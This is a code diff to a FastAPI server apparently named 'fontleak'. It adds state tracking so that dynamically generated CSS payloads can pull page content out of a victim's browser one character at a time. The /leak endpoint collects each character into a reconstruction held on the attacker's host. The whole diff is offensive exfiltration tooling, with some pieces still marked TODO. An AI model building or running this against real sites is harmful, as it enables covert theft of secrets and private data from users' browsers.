@@ -1,9 +1,21 @@
 from fastapi import FastAPI, Request, Depends
 from fastapi.templating import Jinja2Templates
 from fastapi.responses import Response
-from .schemas import DynamicLeakSetupParams, StaticLeakSetupParams, LeakParams, settings
+from .schemas import (
+    DynamicLeakSetupParams,
+    StaticLeakSetupParams,
+    LeakParams,
+    DynamicLeakParams,
+    DynamicLeakState,
+    settings,
+)
 from .logger import logger
 from .cssgen import dynamic as dynamic_css
+import asyncio
+
+# Add in-memory storage for leak states and events
+leak_states = {}
+leak_events = {}
 
 app = FastAPI(
     title="fontleak",
@@ -18,16 +30,42 @@ templates = Jinja2Templates(directory="templates")
 @app.get("/")
 async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
     logger.debug("Handling index request with params: %s", params)
+
+    # Convert to BaseLeakSetupParams
+    base_params = params.model_copy(update={}, deep=True)
+
+    if params.id in leak_states:
+        state = leak_states[params.id]
+        if params.step is None or params.step <= state.step:
+            # Create event if it doesn't exist
+            if params.id not in leak_events:
+                leak_events[params.id] = asyncio.Event()
+            # Wait for the next step
+            await leak_events[params.id].wait()
+    else:
+        # Create new state if id is not specified or not found
+        if params.id is None or params.id not in leak_states:
+            new_id = str(len(leak_states) + 1)
+            leak_states[new_id] = DynamicLeakState(
+                id=new_id,
+                setup=base_params,
+                step=0,
+                reconstruction="",
+                step_map=[0x100] * 1000,
+                font_path="TODO",
+            )
+            params.id = new_id
+
+    state = leak_states[params.id]
+
     template = templates.get_template("dynamic.css.jinja")
-    step = 0 if params.id is None else int(params.id)
-    id = params.id if params.id is not None else "random_id"
     css = dynamic_css.generate(
-        id=id,
-        step=step,
-        step_map=[0x100],
+        id=state.id,
+        step=state.step,
+        step_map=state.step_map,
         template=template,
         alphabet_size=len(params.alphabet),
-        font_path="TODO",
+        font_path=state.font_path,
         host=settings.host,
         leak_selector=params.selector,
     )
@@ -35,7 +73,7 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
 
 
 @app.get("/static")
-async def generate_static_payload(params: StaticLeakSetupParams = Depends()):
+def generate_static_payload(params: StaticLeakSetupParams = Depends()):
     logger.debug("Generating static payload with params: %s", params)
     return {"host": settings.host, **params.model_dump()}
 
@@ -43,11 +81,25 @@ async def generate_static_payload(params: StaticLeakSetupParams = Depends()):
 @app.get("/leak")
 async def leak(request: Request, params: LeakParams = Depends()):
     logger.debug("Handling leak request with params: %s", params)
+
+    if isinstance(params, DynamicLeakParams):
+        if params.id in leak_states:
+            state = leak_states[params.id]
+            # Update reconstruction and step
+            state.reconstruction += params.alphabet[params.idx]
+            state.step += 1
+            leak_states[params.id] = state
+
+            # Notify waiting requests
+            if params.id in leak_events:
+                leak_events[params.id].set()
+                leak_events[params.id].clear()
+
     return {"host": settings.host, **params.model_dump()}
 
 
 @app.get("/test")
-async def test():
+def test():
     logger.debug("Handling test request")
     with open("templates/test.html", "r") as f:
         return Response(content=f.read(), media_type="text/html")
